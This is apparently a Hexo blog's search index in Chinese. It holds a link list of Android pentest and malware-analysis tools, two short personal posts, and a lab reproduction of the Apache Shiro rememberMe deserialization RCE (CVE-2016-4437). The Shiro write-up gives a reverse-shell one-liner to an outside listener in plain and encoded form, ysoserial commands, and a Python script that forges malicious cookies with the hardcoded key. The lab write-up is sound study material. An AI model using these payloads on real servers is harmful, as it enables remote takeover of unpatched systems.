<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Android渗透工具</title>
    <url>/2020/09/05/Android%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p><strong>keyword：我只是互联网的搬运工</strong></p>
<p><strong>参考文章：<a href="https://gbhackers.com/android-security-penetration-testing/">https://gbhackers.com/android-security-penetration-testing/</a></strong></p>
<h2 id="一、在线分析工具"><a href="#一、在线分析工具" class="headerlink" title="一、在线分析工具"></a><strong>一、在线分析工具</strong></h2><ol>
<li><a href="http://andrototal.org/">AndroTotal</a></li>
<li><a href="http://tracedroid.few.vu.nl/">Tracedroid</a></li>
<li><a href="http://www.visualthreat.com/">Visual Threat</a></li>
<li><a href="http://www.mobilemalware.com.br/analysis/index_en.php">Mobile Malware Sandbox</a></li>
<li><a href="https://www.appknox.com/">Appknox</a> - 收费</li>
<li><a href="https://appscan.bluemix.net/mobileAnalyzer">IBM Security AppScan Mobile Analyzer</a> - 收费</li>
<li><a href="https://apkscan.nviso.be/">NVISO ApkScan</a> </li>
<li><a href="http://undroid.av-comparatives.info/">AVC UnDroid</a> </li>
<li><a href="https://habo.qq.com/">habo</a> - 10/day</li>
<li><a href="https://www.virustotal.com/">Virustotal</a> - 最大128MB</li>
<li><a href="http://app-ray.co/">Fraunhofer App-ray</a> - 收费</li>
<li><a href="https://appcritique.boozallen.com/">AppCritique</a> - 上传Android APK并进行免费的安全评估</li>
<li><a href="https://www.nowsecure.com/blog/2016/09/19/announcing-nowsecure-lab-automated/">NowSecure Lab Automated</a> – 对于Android和iOS移动应用程序进行安全测试，该工具可以自动对上传的软件进行静态和动态分析并返回扫描结果；收费</li>
</ol>
<h2 id="二、静态分析工具"><a href="#二、静态分析工具" class="headerlink" title="二、静态分析工具"></a><strong>二、静态分析工具</strong></h2><ol>
<li><a href="https://github.com/maaaaz/androwarn/">Androwarn</a> – 检测并警告用户有关Android应用程序开发的潜在恶意行为</li>
<li><a href="https://github.com/sonyxperiadev/ApkAnalyser">ApkAnalyser</a></li>
<li><a href="https://github.com/honeynet/apkinspector/">APKInspector</a></li>
<li><a href="https://www.cert.org/secure-coding/tools/didfail.cfm">Droid Intent Data Flow Analysis for Information Leakage</a></li>
<li><a href="https://bitbucket.org/srl/droidlegacy">DroidLegacy</a></li>
<li><a href="http://siis.cse.psu.edu/tools.html">Several tools from PSU</a></li>
<li><a href="https://github.com/EugenioDelfa/Smali-CFGs">Smali CFG generator</a></li>
<li><a href="https://blogs.uni-paderborn.de/sse/tools/flowdroid/">FlowDroid</a></li>
<li><a href="https://www.pnfsoftware.com/">Android Decompiler</a> – 收费</li>
<li><a href="http://pscout.csl.toronto.edu/">PSC</a><a href="http://pscout.csl.toronto.edu/">out – A tool that extracts the permission specification from the And</a> - 使用静态分析从Android源码中提取ACL</li>
<li><a href="http://amandroid.sireum.org/">Amandroid</a></li>
<li><a href="https://github.com/dorneanu/smalisca">SmaliSCA</a> – Smali 静态代码分析</li>
<li><a href="https://github.com/douggard/CFGScanDroid">CFGScanDroid</a> – 扫描并比较CFG与恶意程序的CFG</li>
<li><a href="https://github.com/maldroid/maldrolyzer">Madrolyzer</a> – 提取敏感的数据，例如：C&amp;C、电话等</li>
<li><a href="https://www.cs.washington.edu/sparta">SPARTA</a> – 验证应用程序满足信息安全策略</li>
<li><a href="https://github.com/JulianSchuette/ConDroid">ConDroid</a> – 执行符号+具体执行的组合</li>
<li><a href="https://github.com/serval-snt-uni-lu/DroidRA">DroidRA</a></li>
<li><a href="https://github.com/ClaudiuGeorgiu/RiskInDroid">RiskInDroid</a> – 一种用于根据Android应用程序ACL并检测其风险的工具，提供在线演示</li>
<li><a href="https://github.com/SUPERAndroidAnalyzer/super">SUPER</a> – 安全、统一、功能强大且可扩展的分析工具</li>
<li><a href="https://github.com/google/android-classyshark">ClassyShark</a> – 独立的二进制检查工具，可以浏览任何Android可执行文件并显示重要信</li>
</ol>
<h2 id="三、Android漏洞扫描工具"><a href="#三、Android漏洞扫描工具" class="headerlink" title="三、Android漏洞扫描工具"></a><strong>三、Android漏洞扫描工具</strong></h2><ol>
<li><p><a href="https://github.com/linkedin/qark/">QARK</a> – LinkedIn的QARK是为应用程序开发人员扫描应用程序的安全问题</p>
</li>
<li><p><a href="https://github.com/AndroBugs/AndroBugs_Framework">AndroBugs</a></p>
</li>
<li><p><a href="https://github.com/google/nogotofail">Nogotofail</a></p>
</li>
<li><p><a href="https://devknox.io/">Devknox</a> – 自动纠正Android的安全问题</p>
</li>
<li><p><a href="https://github.com/flankerhqd/JAADAS">JAADAS</a> – 程序内和程序间联合程序分析工具，可基于Soot和Scala查找Android应用程序中的漏洞</p>
</li>
</ol>
<h2 id="四、动态分析工具"><a href="#四、动态分析工具" class="headerlink" title="四、动态分析工具"></a><strong>四、动态分析工具</strong></h2><ol>
<li><p><a href="http://www.mulliner.org/blog/blosxom.cgi/security/androiddbiv02.html">Android DBI framework</a></p>
</li>
<li><p><a href="https://github.com/sh4hin/Androl4b">Androl4b</a> – 用于评估Android应用程序、逆向工程和恶意软件分析的虚拟机</p>
</li>
<li><p><a href="http://www.mobilemalware.com.br/amat/download.html">Android Malware Analysis Toolkit</a> – (Linux distro) Earlier it use to be an <a href="http://dunkelheit.com.br/amat/analysis/index_en.php">online analyzer</a></p>
</li>
<li><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">Mobile-Security-Framework MobSF</a> – 自动测试框架，能够执行静态、动态分析和Web API测试</p>
</li>
<li><p><a href="https://appsec-labs.com/AppUse/">AppUse</a> – 为渗透定制架构</p>
</li>
<li><p><a href="https://thecobraden.com/projects/cobradroid/">Cobradroid</a> – 用于恶意软件分析的自定义图像</p>
</li>
<li><p>~~~~<a href="https://github.com/pjlantz/droidbox">Droidbox</a></p>
</li>
<li><p><a href="https://github.com/mwrlabs/drozer">Drozer</a></p>
</li>
<li><p><a href="https://forum.xda-developers.com/xposed/xposed-installer-versions-changelog-t2714053">Xposed</a> – 相当于进行基于存根的代码注入，但不修改二进制代码</p>
</li>
<li><p><a href="https://github.com/ac-pm/Inspeckage">Inspeckage</a> – Android包检查器——动态分析api钩子，启动未导出的活动等等。(Xposed模块)</p>
</li>
<li><p><a href="https://github.com/AndroidHooker/hooker">Android Hooker</a> – 动态Java代码检测</p>
</li>
<li><p><a href="https://github.com/ZSShen/ProbeDroid">ProbeDroid</a> – 动态Java代码检测</p>
</li>
<li><p><a href="https://androidtamer.com/">Android Tamer</a> – 为Android安全专业人士提供的虚拟/实时平台</p>
</li>
<li><p><a href="https://github.com/sycurelab/DECAF">DECAF</a> – 基于QEMU的动态可执行代码分析框架(DroidScope现在是DECAF的扩展)</p>
</li>
<li><p><a href="https://github.com/idanr1986/cuckoo-droid">CuckooDroid</a> – Cuckoo沙盒的Android扩展</p>
</li>
<li><p><a href="https://github.com/MobileForensicsResearch/mem">Mem</a> – Android安全内存分析(需要root用户)</p>
</li>
<li><p><a href="http://www.ida.liu.se/labs/rtslab/publications/2011/spsm11-burguera.pdf">Crowdroid</a> – 无法找到实际的工具</p>
</li>
<li><p><a href="https://github.com/nwhusted/AuditdAndroid">AuditdAndroid</a> – auditd的android端口，不再处于活跃开发状态</p>
</li>
<li><p><a href="https://code.google.com/p/asef/">AndroidSecurity Evaluation Framework</a></p>
</li>
<li><p><a href="https://redmine.honeynet.org/projects/are/wiki">Android Reverse Engineering</a></p>
</li>
<li><p><a href="https://github.com/xurubin/aurasium">Aurasium</a> – 通过字节码重写和就地引用监视器为Android应用实施实际的安全策略。</p>
</li>
<li><p><a href="https://github.com/strazzere/android-lkms">Android Linux Kernel modules</a></p>
</li>
<li><p><a href="https://manifestsecurity.com/appie/">Appie</a> – Appie是一个预先配置为Android Pentesting环境的软件包。它是完全便携式的，可以通过u盘或智能手机携带。这是Android应用程序安全评估所需的所有工具的一站式答案，也是现有虚拟机的一个极好的替代品。</p>
</li>
<li><p><a href="https://github.com/zyrikby/StaDynA">StaDynA</a> – 一个支持动态代码更新特性(动态类加载和反射)下的安全应用分析系统。该工具结合了Android应用的静态和动态分析，以揭示隐藏/更新的行为，并利用这些信息扩展静态分析结果。</p>
</li>
<li><p><a href="https://github.com/zhengmin1989/DroidAnalytics">DroidAnalytics</a></p>
</li>
<li><p><a href="https://github.com/oguzhantopgul/Vezir-Project">Vezir Project</a> – 虚拟机用于手机应用程序测试和手机恶意软件分析</p>
</li>
<li><p><a href="https://github.com/xtiankisutsa/MARA_Framework">MARA</a> – 移动应用逆向工程与分析框架</p>
</li>
<li><p><a href="http://appanalysis.org/download.html">Taintdroid</a>  – 需要AOSP编译</p>
</li>
</ol>
<h2 id="五、逆向工具"><a href="#五、逆向工具" class="headerlink" title="五、逆向工具"></a><strong>五、逆向工具</strong></h2><ol>
<li><p><a href="https://github.com/JesusFreke/smali">Smali/Baksmali</a> – APK反编译</p>
</li>
<li><p><a href="https://github.com/strazzere/Emacs-Smali">emacs syntax coloring for smali files</a></p>
</li>
<li><p><a href="http://codetastrophe.com/smali.vim">vim syntax coloring for smali files</a></p>
</li>
<li><p><a href="https://github.com/swdunlop/AndBug">AndBug</a></p>
</li>
<li><p><a href="https://github.com/androguard/androguard">Androguard</a> – 功能强大，并且可与其他工具很好的集成</p>
</li>
<li><p><a href="https://ibotpeaches.github.io/Apktool/">Apktool</a> – 对于编译/反编译非常有用(使用smali)</p>
</li>
<li><p><a href="https://github.com/appknox/AFE">Android Framework for Exploitation</a></p>
</li>
<li><p><a href="https://github.com/iSECPartners/Android-KillPermAndSigChecks">Bypass signature and permission checks for IPCs</a></p>
</li>
<li><p><a href="https://github.com/iSECPartners/Android-OpenDebug">Android OpenDebug</a> – 使设备上的任何应用程序可调试(使用cydia基板)。</p>
</li>
<li><p><a href="http://siis.cse.psu.edu/dare/index.html">Dare</a> – 将.dex 转换为 .class</p>
</li>
<li><p><a href="https://github.com/pxb1988/dex2jar">Dex2Jar</a> – 将.dex 转换为 .class</p>
</li>
<li><p><a href="https://github.com/google/enjarify">Enjarify</a> – 将.dex 转换为 .class（Chrome）</p>
</li>
<li><p><a href="http://dedexer.sourceforge.net/">Dedexer</a></p>
</li>
<li><p><a href="https://github.com/sysdream/fino">Fino</a></p>
</li>
<li><p><a href="https://www.frida.re/">Frida</a> – 为它注入javascript来探索应用程序和一个<a href="https://github.com/antojoseph/diff-gui">GUI工具</a></p>
</li>
<li><p><a href="https://bitbucket.org/aseemjakhar/indroid">Indroid</a> – 线程注入设备</p>
</li>
<li><p><a href="https://www.nccgroup.trust/us/about-us/resources/intent-sniffer/">IntentSniffer</a></p>
</li>
<li><p><a href="https://github.com/iSECPartners/Introspy-Android">Introspy</a></p>
</li>
<li><p><a href="https://varaneckas.com/jad/">Jad</a></p>
</li>
<li><p><a href="https://github.com/java-decompiler/jd-gui">JD-GUI</a></p>
</li>
<li><p><a href="http://www.benf.org/other/cfr/">CFR</a></p>
</li>
<li><p><a href="https://github.com/Storyyeller/Krakatau">Krakatau</a></p>
</li>
<li><p>[Procyon](<a href="https://bitbucket.org/mstrobel/procyon/wiki/Java">https://bitbucket.org/mstrobel/procyon/wiki/Java</a> Decompiler)</p>
</li>
<li><p><a href="https://github.com/fesh0r/fernflower">FernFlower</a></p>
</li>
<li><p><a href="https://github.com/plum-umd/redexer">Redexer</a></p>
</li>
<li><p><a href="http://blog.avlyun.com/wp-content/uploads/2014/04/SmaliViewer.zip">Smali viewer</a></p>
</li>
<li><p>~~~~<a href="https://github.com/CalebFenton/simplify">Simplify Android deobfuscator</a></p>
</li>
<li><p><a href="https://github.com/Konloch/bytecode-viewer">Bytecode viewer</a></p>
</li>
<li><p><a href="https://github.com/radare/radare2">Radare2</a></p>
</li>
</ol>
<h2 id="六、模糊测试工具"><a href="#六、模糊测试工具" class="headerlink" title="六、模糊测试工具"></a><strong>六、模糊测试工具</strong></h2><ol>
<li><p><a href="https://www.nccgroup.trust/us/about-us/resources/intent-fuzzer/">IntentFuzzer</a></p>
</li>
<li><p><a href="https://github.com/anestisb/radamsa-android">Radamsa Fuzzer</a></p>
</li>
<li><p><a href="https://github.com/google/honggfuzz">Honggfuzz</a></p>
</li>
<li><p><a href="https://github.com/anestisb/melkor-android">An Android port of the melkor ELF fuzzer</a></p>
</li>
<li><p><a href="https://github.com/fuzzing/MFFA">Media Fuzzing Framework for Android</a></p>
</li>
<li><p><a href="https://github.com/jonmetz/AndroFuzz">AndroFuzz</a></p>
</li>
</ol>
<h2 id="七、应用包装检测工具"><a href="#七、应用包装检测工具" class="headerlink" title="七、应用包装检测工具"></a><strong>七、应用包装检测工具</strong></h2><p><a href="https://github.com/zyrikby/FSquaDRA">FSquaDRA</a> - 基于应用程序资源哈希比较检测重新打包的Android应用程序的Android安全工具。</p>
<h2 id="八、下载市场爬虫"><a href="#八、下载市场爬虫" class="headerlink" title="八、下载市场爬虫"></a><strong>八、下载市场爬虫</strong></h2><ol>
<li><p><a href="https://github.com/Akdeniz/google-play-crawler">Google play crawler (Java)</a></p>
</li>
<li><p><a href="https://github.com/egirault/googleplay-api">Google play crawler (Python)</a></p>
</li>
<li><p><a href="https://github.com/dweinstein/node-google-play">Google play crawler (Node) </a>– 获取应用程序详细信息并从官方Google Play商店下载应用程序</p>
</li>
<li><p><a href="https://github.com/dweinstein/node-aptoide">Aptoide downloader (Node)</a> – 从Aptoide第三方Android市场下载应用程序</p>
</li>
<li><p><a href="https://github.com/dweinstein/node-appland">Appland downloader (Node)</a> – 从Apland第三方Android市场下载应用程序</p>
</li>
</ol>
<h2 id="九、杂项工具"><a href="#九、杂项工具" class="headerlink" title="九、杂项工具"></a><strong>九、杂项工具</strong></h2><ol>
<li> <a href="http://androidcracking.blogspot.com/2011/03/original-smalihook-java-source.html">smalihook</a></li>
<li> <a href="http://codekiem.com/2012/02/24/apk-downloader/">APK-Downloader</a></li>
<li> <a href="http://code.google.com/p/android4me/downloads/detail?name=AXMLPrinter2.jar">AXMLPrinter2</a> – 将二进制XML文件转换为可读的XML文件</li>
<li> <a href="https://github.com/mbrubeck/android-completion">adb autocomplete</a></li>
<li> <a href="http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html">Dalvik opcodes</a></li>
<li> <a href="http://ww38.xchg.info/corkami/opcodes_tables.pdf">Opcodes table for quick reference</a></li>
<li> <a href="http://securitycompass.github.io/AndroidLabs/setup.html">ExploitMe Android Labs</a></li>
<li> <a href="https://github.com/jackMannino/OWASP-GoatDroid-Project">GoatDroid</a></li>
<li> <a href="https://github.com/mitmproxy/mitmproxy">mitmproxy</a></li>
<li> <a href="https://github.com/dweinstein/dockerfile-androguard">dockerfile/androguard</a></li>
<li> <a href="https://github.com/AndroidVTS/android-vts">Android Vulnerability Test Suite</a> – android-vts扫描设备的一组漏洞</li>
<li> <a href="https://github.com/dpnishant/appmon">AppMon</a> – AppMon是一个用于监控和篡改本地macOS、iOS和android应用的系统API调用的自动化框架。它是基于Frida。</li>
</ol>
<h2 id="十、学术、研究、出版物、书籍"><a href="#十、学术、研究、出版物、书籍" class="headerlink" title="十、学术、研究、出版物、书籍"></a><strong>十、学术、研究、出版物、书籍</strong></h2><h3 id="10-1-调查报告"><a href="#10-1-调查报告" class="headerlink" title="10.1 调查报告"></a>10.1 调查报告</h3><ol>
<li><p><a href="https://www.exploit-db.com/papers/">Exploit Database</a></p>
</li>
<li><p><a href="https://github.com/jacobsoo/AndroidSlides">Androidsecurity related presentations</a></p>
</li>
<li><p><a href="https://tthtlc.wordpress.com/2011/09/01/static-analysis-of-android-applications/">A good collection of static analysis papers</a></p>
</li>
</ol>
<h3 id="10-2-图书"><a href="#10-2-图书" class="headerlink" title="10.2 图书"></a>10.2 图书</h3><p><a href="https://www.securecoding.cert.org/confluence/display/android/Android+Secure+Coding+Standard">SEI CERT Android Secure Coding Standard</a></p>
<h3 id="10-3-其他"><a href="#10-3-其他" class="headerlink" title="10.3 其他"></a>10.3 其他</h3><ol>
<li><a href="https://github.com/OWASP/owasp-mstg">OWASP Mobile Security Testing Guide Manual</a></li>
<li><a href="http://www.fasteque.com/android-reverse-engineering-101-part-1/">Android Reverse Engineering 101 by Daniele Altomare</a></li>
<li><a href="https://github.com/doridori/Android-Security-Reference">doridori/Android-Security-Reference</a></li>
<li><a href="https://github.com/b-mueller/android_app_security_checklist">android app security checklist</a></li>
<li><a href="https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet">Mobile App Pentest Cheat Sheet</a></li>
</ol>
<h2 id="十一、开发漏洞利用"><a href="#十一、开发漏洞利用" class="headerlink" title="十一、开发漏洞利用"></a><strong>十一、开发漏洞利用</strong></h2><h3 id="11-1-清单"><a href="#11-1-清单" class="headerlink" title="11.1 清单"></a>11.1 清单</h3><ol>
<li><a href="https://source.android.com/security/bulletin/">AndroidSecurity Bulletins</a></li>
<li><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-1224/product_id-19997/Google-Android.html">Android’s reported security vulnerabilities</a></li>
<li><a href="https://kb.androidtamer.com/Device_Security_Patch_tracker/">Android Devices Security Patch Status</a></li>
<li><a href="https://code.google.com/p/android/issues/list?can=2&q=priority=Critical&sort=-opened">AOSP – Issue tracker</a></li>
<li><a href="https://www.owasp.org/index.php/Mobile_Top_10_2016-Top_10">OWASP Mobile Top 10 2016</a></li>
<li><a href="https://www.exploit-db.com/search/?action=search&q=android">Exploit Database</a></li>
<li><a href="https://docs.google.com/spreadsheet/pub?key=0Am5hHW4ATym7dGhFU1A4X2lqbUJtRm1QSWNRc3E0UlE&single=true&gid=0&output=html">Vulnerability Google Doc</a></li>
<li><a href="https://source.android.com/security/reports/Google_Android_Security_PHA_classifications.pdf">Google AndroidSecurity Team’s Classifications for Potentially Harmful Applications (Malware)</a></li>
</ol>
<h3 id="11-2-恶意软件"><a href="#11-2-恶意软件" class="headerlink" title="11.2 恶意软件"></a>11.2 恶意软件</h3><ol>
<li><p><a href="https://code.google.com/p/androguard/wiki/DatabaseAndroidMalwares">androguard – Database Android Malwares wiki</a></p>
</li>
<li><p><a href="https://github.com/ashishb/android-malware">Android Malware Github repo</a></p>
</li>
<li><p><a href="http://www.malgenomeproject.org/policy.html">Android Malware Genome Project</a> – 包含1260个恶意样本</p>
</li>
<li><p><a href="http://contagiominidump.blogspot.com/">Contagio Mobile Malware Mini Dump</a></p>
</li>
<li><p><a href="https://www.virustotal.com/en/about/contact/">VirusTotal Malware Intelligence Service</a> – 付费</p>
</li>
<li><p><a href="http://admire.necst.it/">Admire</a></p>
</li>
<li><p><a href="https://www.sec.cs.tu-bs.de/~danarp/drebin/">Drebin</a></p>
</li>
</ol>
<h2 id="十二、赏金计划"><a href="#十二、赏金计划" class="headerlink" title="十二、赏金计划"></a><strong>十二、赏金计划</strong></h2><p><a href="https://www.google.com/about/appsecurity/android-rewards/">AndroidSecurity Reward Program</a></p>
<h2 id="十三、如何提交漏洞"><a href="#十三、如何提交漏洞" class="headerlink" title="十三、如何提交漏洞"></a><strong>十三、如何提交漏洞</strong></h2><ol>
<li><a href="https://source.android.com/security/overview/updates-resources.html#report-issues">Android – reporting security issues</a></li>
<li><a href="https://github.com/B3nac/Android-Reports-and-Resources">Android Reports and Resources</a> – Android Hackerone披露报告列表等资源</li>
</ol>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>kaoyan first</title>
    <url>/2021/08/02/kaoyan-first/</url>
    <content><![CDATA[<p>之后想经常更新一下在考研中学到的新东西</p>
<p>或者是一些日常总结</p>
<p>笔记整理等</p>
<p><strong>正式开始！！！</strong></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>A nice day</title>
    <url>/2021/08/02/it&#39;s-nice-day/</url>
    <content><![CDATA[<p><img src="https://ckcah.github.io/images/me/hand.jpg" alt="hand"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <tags>
        <tag>me</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro复现报告</title>
    <url>/2020/08/14/shiro%E5%A4%8D%E7%8E%B0%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<p>这里有一个我找到的docker环境，推荐大家使用</p>
<p>vulhub/shiro    1.2.4   331MB</p>
<h4 id="关于反序列化"><a href="#关于反序列化" class="headerlink" title="关于反序列化"></a>关于反序列化</h4><p>在序列化与反序列化的过程中，会有一个问题，就是在反序列化的时候会自动执行类的readObject方法。如果我们在readObject中有恶意的操作，即可造成攻击。</p>
<h4 id="介绍shiro"><a href="#介绍shiro" class="headerlink" title="介绍shiro"></a>介绍shiro</h4><p>Apache Shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。Apache Shiro框架提供了记住我（RememberMe）的功能，关闭浏览器再次访问时无需再登录即可访问。shiro默认使用CookieRememberMeManager，对rememberMe的cookie做了加密处理，在CookieRememberMeManaer类中将cookie中rememberMe字段内容先后进行序列化、AES加密、Base64编码操作。服务器端识别身份解密处理cookie的流程则是：</p>
 <span id="more"></span> 

<p>（1）获取rememberMe cookie</p>
<p>（2）base64 解码</p>
<p>（3）AES解密（加密密钥硬编码）</p>
<p>（4）反序列化（未作过滤处理）</p>
<p>但是AES加密的密钥Key被硬编码(密钥初始就被定义好不能动态改变的)在代码里，这就意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者可以构造一个恶意的对象，并且对其序列化、AES加密、base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终就造成了反序列化的RCE漏洞。只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都可能会导致该漏洞的产生。</p>
<p>CVE-2016-4437</p>
<p>漏洞影响版本：</p>
<p>Apache Shiro &lt;= 1.2.4</p>
<p>它的原理有些复杂，，，我还真不知道自己理解的对不对，大家可以参考下边我的想法（结合这篇公众号文章理解）</p>
<p>本人理解：大概就是因为程序里面因为Ａ类定义的ａ方法直接传入了一个对象，并且没有进行反序列化，然后恰巧有这么一个类Ｂ它的构造方法是直接放回传入的参数，它的ａ方法也是直接返回传入的参数。那么也就是说 把xx.class 传入 B作为这个方法的数组的起点，通过第一次的ａ方法，就可以直接得到某个东西。后面再利用循环调用ａ就可以通过反射命令执行。</p>
<p>所以就是说，可以通过循环调用transform方法来执行命令。</p>
<p>然后其中还有很多细节，反正慢慢理解。</p>
<p><a href="https://mp.weixin.qq.com/s/LbBsok1sRRTEJtXMwjx2zg">https://mp.weixin.qq.com/s/LbBsok1sRRTEJtXMwjx2zg</a></p>
<p>（晕了别怪我哈）</p>
<h4 id="漏洞确定"><a href="#漏洞确定" class="headerlink" title="漏洞确定"></a>漏洞确定</h4><p>１．burp抓包查看是否存在rememberMe＝delete me参数</p>
<p>２．shiro工具测试命令执行</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>１．这里我就先直接用雷石安全实验室大佬的现成工具了（白嫖的。。。）</p>
<p>２．这里还有一个可以自行编译，进行利用的工具，由于不知道为什么出错，暂时就没调试（因为懒）</p>
<p><a href="https://github.com/frohoff/ysoserial.git">https://github.com/frohoff/ysoserial.git</a></p>
<p>步骤：</p>
<p>１．先将文件下载至主机中</p>
<p>２．安装”mvn”命令，进行java文件的编译</p>
<p>３．ysoserial-0.0.6-SNAPSHOT-all.jar在/ysoserial/target/下</p>
<p>４．直接java执行命令。进行攻击</p>
<p>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 “bash命令”</p>
<p>注意：</p>
<p>payloads/JRMPClient是结合exploit/JRMPListener使用的。</p>
<p>JRMPListener是ysoserial 工具里的其中一个利用模块，作用是通过反序列化，开启当前主机的一个 JRMP Server 。</p>
<p>具体的利用过程是，将反序列化数据发送到 Server中，然后在Server中进行反序列化操作，并开启指定端口，然后再通过JRMPClient去发送攻击 payload；payloads/JRMPClient生成的payload是发送给目标服务器的，exploit/JRMPListener 是在自己的攻击机上使用的。</p>
<p>这里最后的bash命令需要使用Java Runtime配置bash编码（地址:<a href="http://www.jackson-t.ca/runtime-exec-payloads.html%EF%BC%89%E3%80%82%E4%B9%8B%E6%89%80%E4%BB%A5%E9%9C%80%E8%A6%81%E7%BC%96%E7%A0%81%E8%80%8C%E4%B8%8D%E6%98%AF%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8bash%E5%91%BD%E4%BB%A4%E6%98%AF%E5%9B%A0%E4%B8%BA%E5%9C%A8exec()%E5%87%BD%E6%95%B0%E4%B8%AD%EF%BC%8C&quot;&gt;&quot;%E7%AE%A1%E9%81%93%E7%AC%A6%E6%98%AF%E6%B2%A1%E6%9C%89%E6%84%8F%E4%B9%89%E7%9A%84%EF%BC%8C%E4%BC%9A%E8%A2%AB%E8%A7%A3%E6%9E%90%E4%B8%BA%E5%85%B6%E4%BB%96%E7%9A%84%E6%84%8F%E4%B9%89%EF%BC%8C%E8%80%8C%E6%88%91%E4%BB%AC%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E4%B8%AD%E5%8F%88%E5%BF%85%E9%A1%BB%E4%BD%BF%E7%94%A8%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%B1%E9%9C%80%E8%A6%81%E7%BC%96%E7%A0%81%E3%80%82">http://www.jackson-t.ca/runtime-exec-payloads.html）。之所以需要编码而不是直接使用bash命令是因为在exec()函数中，&quot;&gt;&quot;管道符是没有意义的，会被解析为其他的意义，而我们的反弹shell命令中又必须使用，所以就需要编码。</a></p>
<p>另外，StringTokenizer类会破坏其中包含空格的参数，该类将命令字符串按空格分隔。比如 ls “My Directory”将被解释为ls ‘“My’ ‘Directory”‘。</p>
<p>（解释这么多，其实大概就是一句话，既然是反序列化，就一定涉及到编码，而编码的时候，管道符和空格会被解析，所以干脆就用编码去绕过）</p>
<p>这里用到的命令是常见的想要获取服务器的shell：</p>
<p>bash -i &gt;&amp; /dev/tcp/192.168.1.103/6666 0&gt;&amp;1</p>
<p>编码后：</p>
<p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAzLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}</p>
<p>执行：</p>
<p>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAzLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}”</p>
<p>接下来就是端口监测，poc.py代码如下</p>
<p>－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－</p>
<p>import sys</p>
<p>import uuid</p>
<p>import base64</p>
<p>import subprocess</p>
<p>from Crypto.Cipher import AES</p>
<p>def encode_rememberme(command):</p>
<p>  popen = subprocess.Popen([‘java’, ‘-jar’, ‘ysoserial-master-30099844c6-1.jar’, ‘JRMPClient’, command], stdout=subprocess.PIPE)</p>
<p>  BS = AES.block_size</p>
<p>  pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</p>
<p>  key = base64.b64decode(“kPH+bIxk5D2deZiIxcaaaA==”)</p>
<p>  iv = uuid.uuid4().bytes</p>
<p>  encryptor = AES.new(key, AES.MODE_CBC, iv)</p>
<p>  file_body = pad(popen.stdout.read())</p>
<p>  base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</p>
<p>  return base64_ciphertext</p>
<p>if <strong>name</strong> == ‘<strong>main</strong>‘:</p>
<p>  payload = encode_rememberme(sys.argv[1])</p>
<p>print “rememberMe={0}”.format(payload.decode())</p>
<p>－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－</p>
<p>python poc.py 监听服务器ip:端口</p>
<p>生成了payload</p>
<p>向服务器发送payload的cookie</p>
<p>成功获取到shell。</p>
